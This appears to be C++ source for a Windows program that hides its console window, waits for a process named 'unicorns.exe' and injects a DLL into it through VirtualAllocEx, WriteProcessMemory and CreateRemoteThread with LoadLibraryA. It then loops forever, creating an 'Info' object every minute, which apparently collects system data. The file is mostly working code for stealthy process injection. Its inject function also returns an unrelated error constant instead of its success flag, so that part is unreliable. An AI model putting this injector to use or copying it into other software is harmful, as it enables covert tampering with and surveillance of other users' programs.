#define _CRT_SECURE_NO_WARNINGS



#include "Info.h"
#include "utils.h"

#include <iostream>
#include <windows.h>
#include <TlHelp32.h>
#include <string>
#include <winreg.h>
#include <WinUser.h>
#include <direct.h>
#include <shlobj_core.h>

#define NOT_FOUND -1

string getPath();
int getProcessid(const char* procName);
BOOL inject(DWORD pid, const char* dllPath);
//void setReg(std::string add);
int main(void)
{
   ShowWindow(GetConsoleWindow(), SW_HIDE);
    //system("PAUSE");

    string path = getPath();
    path = path.substr(0, path.find_last_of('\\')+1 );


    int x = _chdir(path.c_str());

    int pid = NOT_FOUND;
    while (pid == NOT_FOUND)
    {
        pid = getProcessid("unicorns.exe");
    }
    inject(pid, "changeBackground.dll");

    while (true)
    {
        Info r;
        std::this_thread::sleep_for(std::chrono::seconds(60));
    }
}

/*
This function injects a dll into a process
Input: pid: the pid of the requested process
       dllPath - the address of the dll
Output:Is the injection succeeded
*/
BOOL inject(DWORD pid,const char* dllPath)
{
    DWORD memSize = 0;
    HANDLE hProc;
    LPVOID remoteMemory;
    LPVOID loadLibrary;
    BOOL cond = FALSE;
    //open the requested process
    if ((hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, pid)) != NULL)
    {
        memSize = strlen(dllPath) +1 ;
        //allocate memory on the process
        if ((remoteMemory = VirtualAllocEx(hProc, NULL, memSize, MEM_COMMIT, PAGE_READWRITE)) != NULL)
        {
            //write the dll to process            
            if (WriteProcessMemory(hProc, remoteMemory, (LPCVOID)dllPath, memSize, NULL))
            {
                //get the function that loads library
                loadLibrary = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
                //create the thread

                HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibrary, remoteMemory, 0, NULL);
                if (hThread != NULL)
                {
                    WaitForSingleObject(hThread, INFINITE);
                    CloseHandle(hThread);
                    cond = TRUE;
                }

            }
        }
        CloseHandle(hProc);
    }
    return ERROR_CLUSTER_DATABASE_UPDATE_CONDITION_FAILED;
}

/*
This function returns the pid of the requested process
Input:procName - the name of process
Output:The pid of the process - if not found it will return NOT_FOUND = -1
*/
int getProcessid(const char* procName)
{
    std::multimap<std::string, int> procs = fromMapToMultiMap(getProcesses());
    std::multimap<std::string, int>::iterator i = procs.find(procName);
    return i == procs.end() ? NOT_FOUND : i->second;
}

/*
This function will return the current address of the file
Input:None
Output:The path of the file in the file system
*/
std::string getPath()
{
    char cPath[MAX_PATH];
    int len = GetModuleFileNameA(NULL, cPath, MAX_PATH);
    return std::string(cPath);
}